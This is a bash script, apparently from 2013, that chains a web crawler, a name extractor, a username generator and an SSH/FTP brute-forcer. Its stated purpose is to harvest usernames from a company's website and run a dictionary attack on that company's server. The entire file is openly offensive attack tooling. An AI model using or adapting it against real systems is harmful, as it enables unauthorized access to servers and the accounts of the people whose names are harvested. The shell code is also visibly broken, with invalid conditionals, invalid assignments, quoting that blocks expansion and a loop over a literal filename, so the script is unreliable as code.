#!/bin/bash

# Date: 1/13/2013
# Script: UsernameMiner.sh
# Author: FolieADeux
# This script is intended to bring 4 of my other programs
# together to complete a larger purpose. This is to mine
# usernames from a company's webpage and use those to
# bruteforce a server. This process is done in 4 steps.
# 1: The first step is to use the program WebCrawler.py
#    to enumerate all pages within a website.
# 2: The second step is to user the program NameExtractor.py
#    to extract all names from the pages within that website.
#    the program includes name lists for American English
#    names, but in theory should work with any name lists
#    or even two word combinations.
# 3: The third step is to use UserListGen.py to take the
#    names extracted in step 2 and generate a list of usernames
#    to be used in step 4.
# 4: The last step is to use SSHBruter or FTPBruter to
#    use those usernames in combination with a wordlist
#    to perform a dictionary attack against a server.
#    This step can be expanded to other protocols by editing
#    Bruteforcer.py and creating a new Bruter.py script to run
#    the right commands.

#Handle Arguments
if $# == 5
then

  echo 'Crawling website...'
	CMD = './WebCrawler.py $1, resultsCrawler.txt, internal, 15'
	$CMD

	echo 'Extracting names...'
	echo 'Please write to the end of the output file.'

	for url in resultsCrawler.txt
	do
		CMD = './NameExtractor.py $url, FirstNames.txt, LastNames.txt, resultsNames.txt'
		$CMD
	done

	echo 'Mutating names...'

	CMD = './UserListGen.py resultsNames.txt, resultsUsers.txt'
	$CMD

	echo 'Bruteforcing server...'
	echo 'This may take a long time.'

	bruterScript = 'Bruter.py'
	bruterScriptName = $4$bruterScript

	CMD = './$bruterScriptName $2 $3 resultsUsers.txt $5'
	$CMD

else

	echo 'Usage: ' $0 ' TARGET_URL TARGET_IP PORT PROTOCOL WORD_LIST'
	echo 'Protocol must have a Bruter.py script.'

fi
